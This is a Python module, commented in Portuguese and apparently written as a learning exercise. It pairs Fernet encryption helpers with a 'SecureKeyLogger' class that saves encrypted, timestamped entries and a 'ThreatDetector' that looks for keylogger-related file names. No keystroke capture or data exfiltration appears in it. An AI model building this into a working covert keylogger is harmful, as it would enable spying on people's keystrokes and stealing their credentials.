"""
Módulo Security - Segurança e Encriptação

Classes:
    EncryptionManager: Gerencia chaves e encriptação
    SecureKeyLogger: Keylogger com dados encriptados
    ThreatDetector: Detecta ameaças no sistema
"""

from cryptography.fernet import Fernet
from datetime import datetime
from typing import Optional
import os
import json


class EncryptionManager:
    """
    Gerenciador de encriptação de dados.
    
    Example:
        >>> manager = EncryptionManager("chave.key")
        >>> manager.encrypt("dados sensíveis")
    """
    
    def __init__(self, key_file: str = "chave.key"):
        """
        Inicializa o gerenciador de encriptação.
        
        Args:
            key_file: Arquivo que armazena a chave
        """
        self.key_file = key_file
        self.cipher = None
        self._load_or_create_key()
    
    def _load_or_create_key(self) -> None:
        """Carrega ou cria nova chave."""
        if os.path.exists(self.key_file):
            self._load_key()
        else:
            self._create_key()
    
    def _create_key(self) -> None:
        """Cria nova chave de encriptação."""
        key = Fernet.generate_key()
        with open(self.key_file, 'wb') as f:
            f.write(key)
        self.cipher = Fernet(key)
        print(f"🔑 Nova chave criada: {self.key_file}")
    
    def _load_key(self) -> None:
        """Carrega chave existente."""
        with open(self.key_file, 'rb') as f:
            key = f.read()
        self.cipher = Fernet(key)
        print(f"🔑 Chave carregada: {self.key_file}")
    
    def encrypt(self, data: str) -> bytes:
        """
        Encripta dados.
        
        Args:
            data: String a encriptar
            
        Returns:
            Dados encriptados
        """
        return self.cipher.encrypt(data.encode())
    
    def decrypt(self, encrypted_data: bytes) -> str:
        """
        Descriptografa dados.
        
        Args:
            encrypted_data: Dados encriptados
            
        Returns:
            String descriptografada
        """
        return self.cipher.decrypt(encrypted_data).decode()
    
    def rotate_key(self, new_key_file: str = "chave_new.key") -> None:
        """
        Rotaciona a chave de encriptação.
        
        Args:
            new_key_file: Arquivo para nova chave
        """
        # Gerar nova chave
        new_key = Fernet.generate_key()
        with open(new_key_file, 'wb') as f:
            f.write(new_key)
        
        print(f"✅ Nova chave gerada: {new_key_file}")
        print("⚠️ Dados antigos precisam ser re-encriptados com nova chave")


class SecureKeyLogger:
    """
    Keylogger com encriptação de dados.
    
    Example:
        >>> logger = SecureKeyLogger()
        >>> logger.start()
    """
    
    def __init__(
        self,
        log_file: str = "keys.enc",
        key_file: str = "chave.key"
    ):
        """
        Inicializa o keylogger seguro.
        
        Args:
            log_file: Arquivo de log encriptado
            key_file: Arquivo de chave de encriptação
        """
        self.log_file = log_file
        self.encryption = EncryptionManager(key_file)
        self.key_count = 0
    
    def register_key(self, key_data: str) -> None:
        """
        Registra uma tecla com encriptação.
        
        Args:
            key_data: Dados da tecla
        """
        timestamp = datetime.now().isoformat()
        message = f"[{timestamp}] {key_data}"
        
        # Encriptar
        encrypted = self.encryption.encrypt(message)
        
        # Salvar
        with open(self.log_file, 'ab') as f:
            f.write(encrypted + b"\n")
        
        self.key_count += 1
    
    def read_log(self) -> None:
        """Lê e descriptografa o log."""
        print("\n📖 CONTEÚDO DESCRIPTOGRAFADO:")
        print("="*60)
        
        try:
            with open(self.log_file, 'rb') as f:
                for i, linha in enumerate(f, 1):
                    linha = linha.strip()
                    if linha:
                        try:
                            descriptografado = self.encryption.decrypt(linha)
                            print(f"{i}: {descriptografado}")
                        except Exception as e:
                            print(f"❌ Erro ao descriptografar linha {i}: {e}")
        except FileNotFoundError:
            print(f"❌ Arquivo {self.log_file} não encontrado")
    
    def get_statistics(self) -> dict:
        """Retorna estatísticas."""
        return {
            "log_file": self.log_file,
            "key_count": self.key_count,
            "timestamp": datetime.now().isoformat()
        }


class ThreatDetector:
    """
    Detecta ameaças e comportamentos suspeitos.
    
    Example:
        >>> detector = ThreatDetector()
        >>> detector.check_suspicious_files()
    """
    
    SUSPICIOUS_FILES = [
        "keys.log",
        "log.txt",
        "log.enc",
        "keylogger.py",
        "chave.key"
    ]
    
    def __init__(self):
        """Inicializa o detector."""
        self.alerts = []
    
    def check_suspicious_files(self) -> dict:
        """Verifica arquivos suspeitos."""
        found = {}
        
        for arquivo in self.SUSPICIOUS_FILES:
            if os.path.exists(arquivo):
                tamanho = os.path.getsize(arquivo)
                found[arquivo] = tamanho
                self.alerts.append(f"Arquivo suspeito encontrado: {arquivo}")
        
        return found
    
    def generate_security_checklist(self) -> dict:
        """Gera checklist de segurança."""
        checklist = {
            "timestamp": datetime.now().isoformat(),
            "checks": {
                "antivirus": "⚠️ Verificar",
                "windows_updated": "⚠️ Verificar",
                "2fa_enabled": "❌ Não ativado",
                "strong_password": "❌ Verificar",
                "vpn_active": "❌ Não ativo",
                "suspicious_files": len(self.check_suspicious_files()) > 0
            }
        }
        
        return checklist
    
    def export_security_report(self, output_file: str = "seguranca_relatorio.json") -> None:
        """
        Exporta relatório de segurança.
        
        Args:
            output_file: Arquivo de saída
        """
        report = {
            "timestamp": datetime.now().isoformat(),
            "suspicious_files": self.check_suspicious_files(),
            "security_checklist": self.generate_security_checklist(),
            "alerts": self.alerts
        }
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, default=str)
        
        print(f"✅ Relatório de segurança salvo: {output_file}")
    
    def print_alerts(self) -> None:
        """Imprime alertas de segurança."""
        if self.alerts:
            print("\n" + "="*60)
            print("⚠️ ALERTAS DE SEGURANÇA")
            print("="*60)
            for alert in self.alerts:
                print(f"  🚨 {alert}")
            print("="*60)
        else:
            print("\n✅ Nenhum alerta de segurança")
